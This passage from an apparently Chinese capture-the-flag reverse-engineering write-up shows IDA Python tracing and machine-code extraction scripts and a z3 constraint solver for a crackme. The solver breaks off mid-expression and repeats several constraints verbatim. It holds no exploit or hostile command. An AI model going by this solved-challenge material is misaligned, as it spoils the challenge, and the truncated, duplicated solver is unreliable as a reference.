</span></span><span style="display:flex;"><span>ea <span style="color:#f92672">=</span> get_reg_value(<span style="color:#e6db74">&#39;eip&#39;</span>)
</span></span><span style="display:flex;"><span>end <span style="color:#f92672">=</span> ea <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1806</span>
</span></span><span style="display:flex;"><span>main_func <span style="color:#f92672">=</span> get_func_name(ea)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>fp <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;all_asm.txt&#39;</span>,<span style="color:#e6db74">&#39;w&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>    ea <span style="color:#f92672">=</span> get_reg_value(<span style="color:#e6db74">&#39;eip&#39;</span>)
</span></span><span style="display:flex;"><span>    next_ea <span style="color:#f92672">=</span> next_head(ea)
</span></span><span style="display:flex;"><span>    fp<span style="color:#f92672">.</span>write(hexlify(get_bytes(ea, next_ea <span style="color:#f92672">-</span> ea))<span style="color:#f92672">.</span>decode())
</span></span><span style="display:flex;"><span>    fp<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> GetDisasm(ea)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ea <span style="color:#f92672">&gt;=</span> end:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> main_func <span style="color:#f92672">==</span> get_func_name(ea):
</span></span><span style="display:flex;"><span>        step_into()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        step_over()
</span></span><span style="display:flex;"><span>    wait_for_next_event(WFNE_SUSP, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
</span></span></code></pre></div><p>然后观察特征，使用jnz和jmp指令作为子模块的标识，进一步提取</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>codes <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;all_asm.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;asm.txt&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(codes)):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> codes[i]<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#39;jnz&#39;</span>) <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">and</span> codes[i<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#39;jnz&#39;</span>) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>        j <span style="color:#f92672">=</span> i<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> j <span style="color:#f92672">&lt;</span> len(codes) <span style="color:#f92672">and</span> codes[j]<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#39;jmp&#39;</span>) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>            c<span style="color:#f92672">.</span>write(codes[j]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>            j <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>codes <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;asm.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>codes <span style="color:#f92672">=</span> [i[:i<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#39;</span>)] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> codes]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>datas <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> codes:
</span></span><span style="display:flex;"><span>    datas <span style="color:#f92672">+=</span> unhexlify(i)
</span></span><span style="display:flex;"><span>datas <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xc3</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>print(datas)
</span></span><span style="display:flex;"><span>open(<span style="color:#e6db74">&#39;mch1&#39;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>)<span style="color:#f92672">.</span>write(datas)
</span></span></code></pre></div><p>将对应的机器码写入文件里，并补齐栈平衡以及函数返回，使用 ida 反调试得到清晰的结构</p>
<p>根据提示中的绝对值相关列出数个方程，z3 求解即可</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> z3 <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>a1 <span style="color:#f92672">=</span> [BitVec(<span style="color:#e6db74">&#39;x</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> i, <span style="color:#ae81ff">32</span>)<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">28</span>)]
</span></span><span style="display:flex;"><span>con1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">40085</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">3</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">222506</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">2</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">54507</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">4</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">88056</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">212571</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">5</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">160722</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">434973</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>con2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">49300</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">3</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">259229</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">278066</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">2</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">127937</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">295169</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">4</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">8368677</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>con3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">42214</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">108025</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">3</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">205972</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">27559</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">2</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">17114904</span>
</span></span><span style="display:flex;"><span>con4 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">151496</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">204740</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">80143</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">2</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">12295783</span>
</span></span><span style="display:flex;"><span>con5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">241935</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">124128</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">38790036</span>
</span></span><span style="display:flex;"><span>con6 <span style="color:#f92672">=</span> <span style="color:#ae81ff">273221</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">27868542</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>con7 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">279656</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">2</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">199574</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">258130</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">8</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">200399</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">3</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">173903</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">7</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">175816</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">234569</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">6</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">108273</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">4</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">222957</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">5</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">128244179</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>con8 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">81541</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">268763</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">219073</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">3</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">34782</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">6</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">21153</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">5</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">173005</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">7</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">76285</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">4</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">32825</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">2</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">13874925</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>con9 <span style="color:#f92672">=</span> <span style="color:#ae81ff">85214</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">2</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">268299</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">3</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">230981</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">290772</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">5</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">74394</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">4</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">28044</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">6</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">242995</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">50871139</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>con10 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">279656</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">2</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">199574</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">258130</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">8</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">200399</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">3</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">173903</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">7</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">175816</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">234569</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">6</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">108273</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">4</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">222957</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">5</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">128244179</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>con11 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">81541</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">268763</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">219073</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">3</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">34782</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">6</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">21153</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">5</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">173005</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">7</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">76285</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">4</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">32825</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">2</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">13874925</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>con12 <span style="color:#f92672">=</span> <span style="color:#ae81ff">85214</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">2</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">268299</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">3</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">230981</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">290772</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">5</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">74394</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">4</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">28044</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">6</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">242995</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">50871139</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>con13 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">208564</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">81934</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">9</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">106641</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">7</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">198477</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">2</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">154505</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">48440</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">5</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">149004</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">3</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">108909</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">4</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">51714</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">10</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">296420</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">8</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">263021</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">6</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">688726</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>con14 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">131130</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">2</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">224265</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">3</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">230702</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">176285</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">7</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">274778</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">4</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">103848</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">8</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">136039</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">9</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">241151</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">5</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">15542</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">6</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">17521</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">41644083</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>con15 <span style="color:#f92672">=</span> <span style="color:#ae81ff">195056</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">4</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">15717</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">9</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">180214</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">6</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">114427</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">5</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">277782</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">7</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">261379</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">8</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">225266</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">2</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">107609</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">259792</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">3</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">270563</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">11</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">205124</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">138334</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">10</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">103474</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">12</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">117027475</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>con16 <span style="color:#f92672">=</span> <span style="color:#ae81ff">189573</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">8</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">64393</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">6</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">231137</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">145315</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">4</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">53938</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">10</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">291345</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">5</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">216413</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">3</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">204681</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">65519</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">9</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">262826</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">2</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">187002</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">7</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">271732</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">11</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">38663722</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>con17 <span style="color:#f92672">=</span> <span style="color:#ae81ff">15645</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">13</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">276267</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">12</span>]\
